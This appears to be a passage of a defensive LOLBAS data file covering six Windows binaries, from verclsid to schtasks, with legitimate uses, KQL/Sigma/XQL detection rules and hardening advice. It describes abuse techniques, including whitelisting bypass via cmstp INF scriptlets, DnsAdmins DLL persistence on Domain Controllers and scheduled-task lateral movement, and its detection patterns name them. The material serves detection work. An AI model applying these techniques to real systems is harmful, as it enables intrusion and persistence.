lolbins.description: Verifies a COM object before Windows Explorer instantiates it. It is LOLBAS-relevant because it can be pointed at an attacker-registered or hijacked CLSID to instantiate and execute a COM payload directly.
lolbins.legitimate_use: Normally invoked silently by Windows Explorer's shell-extension verification logic before loading unfamiliar COM shell extensions.

example_commands.purpose: Instantiates and executes a registered or hijacked COM object by CLSID

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "verclsid.exe"
| where ProcessCommandLine has "/C"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
detection_queries.sigma:
title: Verclsid Executing Attacker CLSID
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\verclsid.exe'
    CommandLine|contains: '/C'
  filter_explorer:
    ParentImage|endswith: '\explorer.exe'
  condition: selection and not filter_explorer
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "verclsid.exe"
| filter causality_actor_process_image_name != "explorer.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, causality_actor_process_image_name

false_positives: Legitimate Explorer shell-extension verification, which runs verclsid silently in the background with Explorer as parent
defence_guidance: Verclsid.exe is rarely invoked directly by users; alert on any command-line invocation not spawned by explorer.exe
Consider blocking via WDAC since scripted or manual invocation is inherently suspicious

lolbins.name: msxsl.exe
lolbins.description: A standalone command-line utility (not shipped with Windows by default) for performing XSL transformations. It is LOLBAS-relevant because XSL stylesheets can embed COM scriptlet code that executes during the transform, and remote XML/XSL pairs can be fetched and run directly.
lolbins.legitimate_use: Used by developers and data-integration jobs to apply XSLT transformations to XML documents from the command line.

example_commands.purpose: Fetches remote XML/XSL files and executes embedded COM scriptlet code during the transform

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "msxsl.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath
detection_queries.sigma:
title: Msxsl.exe Presence or Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\msxsl.exe'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "msxsl.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line, action_process_image_path

false_positives: Legitimate XML/XSLT batch transformation tooling deliberately deployed by developers or data-integration jobs (rare, since msxsl is not installed by default)
defence_guidance: Msxsl.exe is not shipped with Windows; since it must be dropped onto a host first, blocking or alerting on its mere presence via WDAC path/hash rules is low-risk and high-value
Where a genuine business need exists, restrict to a known, signed copy in an approved directory

lolbins.name: cmstp.exe
lolbins.description: The Microsoft Connection Manager Profile Installer, which installs or removes VPN/dial-up connection profiles from an .inf file. It is LOLBAS-relevant because a crafted INF can contain an UnRegisterOCXSection that executes a remote or local .sct scriptlet via scrobj.dll, bypassing application whitelisting.
lolbins.legitimate_use: Installs Connection Manager service profiles used to configure VPN or dial-up network connections.

example_commands.purpose: Silently installs a crafted Connection Manager profile INF that executes an embedded SCT scriptlet, bypassing application whitelisting
Same technique using a remotely hosted INF file

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "cmstp.exe"
| where ProcessCommandLine has "/s" and ProcessCommandLine has ".inf"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Cmstp AWL Bypass via Malicious INF
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\cmstp.exe'
    CommandLine|contains:
      - '/ni'
      - '/s'
  condition: selection
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "cmstp.exe"
| filter action_process_image_command_line contains "/s" and action_process_image_command_line contains ".inf"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate VPN/dial-up Connection Manager profile deployment (rare in modern estates using native VPN clients)
defence_guidance: Cmstp.exe is a Microsoft-recommended WDAC block-rule binary; Connection Manager profiles are largely legacy technology, so blocking carries low operational impact for most organizations
Where retained, alert on any /s invocation targeting an INF outside a known corporate VPN deployment path

lolbins.name: PresentationHost.exe
lolbins.description: Hosts XAML Browser Applications (XBAP), a now-deprecated WPF technology for browser-delivered applications. It is LOLBAS-relevant because it will execute a local .xbap file or fetch and cache a remote payload.
lolbins.legitimate_use: Historically hosted internal line-of-business XAML Browser Applications delivered through Internet Explorer.

example_commands.purpose: Executes a XAML Browser Application (XBAP), which can carry attacker code

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "presentationhost.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath
detection_queries.sigma:
title: PresentationHost XBAP Execution
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\PresentationHost.exe'
  condition: selection
level: medium
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "presentationhost.exe"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate internal XBAP applications (rare; XBAP is deprecated technology in modern .NET/Edge)
defence_guidance: XBAP execution is deprecated technology with essentially no remaining legitimate use in most organizations; blocking presentationhost.exe via WDAC carries very low operational risk
Where any internal XBAP app is still in use, scope allowed .xbap execution to a known, signed application path

lolbins.name: dnscmd.exe
lolbins.description: A command-line interface for managing Microsoft DNS Server. It is LOLBAS-relevant because a member of the DnsAdmins group can register an attacker-controlled DLL as a DNS server plug-in, achieving code execution and persistence with SYSTEM privileges on a Domain Controller.
lolbins.legitimate_use: Used by DNS/AD administrators to configure and manage zones, records, and server-level settings on a Windows DNS Server.

attack_techniques.name: Create or Modify System Process: Windows Service

example_commands.purpose: Registers a malicious DLL as a DNS server plug-in for SYSTEM-level persistence on a Domain Controller

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "dnscmd.exe"
| where ProcessCommandLine has "serverlevelplugindll"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Dnscmd Serverlevelplugindll Persistence
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\dnscmd.exe'
    CommandLine|contains: 'serverlevelplugindll'
  condition: selection
level: critical
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "dnscmd.exe"
| filter action_process_image_command_line contains "serverlevelplugindll"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate DNS server plug-in configuration by DNS/AD administrators deploying an approved extensibility DLL (extremely rare in normal operations)
defence_guidance: Tightly restrict DnsAdmins group membership — this is the well-known DnsAdmins-to-Domain-Controller compromise path
Alert on any /config /serverlevelplugindll usage; there is essentially no routine business need for it outside a specific, planned DNS extensibility deployment

lolbins.name: schtasks.exe
lolbins.description: Command-line interface to the Windows Task Scheduler. It is LOLBAS-relevant because it can create recurring or remote scheduled tasks that re-execute a payload, providing both persistence and lateral-movement capability.
lolbins.legitimate_use: Used by administrators and deployment tools to create, modify, and manage scheduled tasks for patching, backups, and monitoring agents.

example_commands.purpose: Creates a scheduled task that re-executes a payload every minute for persistence
Creates a scheduled task on a remote host for persistence or lateral movement

detection_queries.kql:
DeviceProcessEvents
| where FileName =~ "schtasks.exe"
| where ProcessCommandLine has "/create"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
detection_queries.sigma:
title: Suspicious Scheduled Task Creation via Schtasks
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains: '/create'
  susp_path:
    CommandLine|contains:
      - '\Users\Public\'
      - '\Temp\'
      - '\AppData\'
  condition: selection and susp_path
level: high
detection_queries.xql:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = "schtasks.exe"
| filter action_process_image_command_line contains "/create"
| fields agent_hostname, actor_effective_username, action_process_image_command_line

false_positives: Legitimate IT-deployed scheduled tasks for patching, backups, and monitoring agents
Software installers registering an update-check task during setup
defence_guidance: Schtasks.exe cannot be blocked (core admin tool); instead baseline expected task names, authors, and /tr targets
Alert on new tasks created by non-administrative processes or with /tr targets pointing into user-writable paths such as Temp, Downloads, or AppData
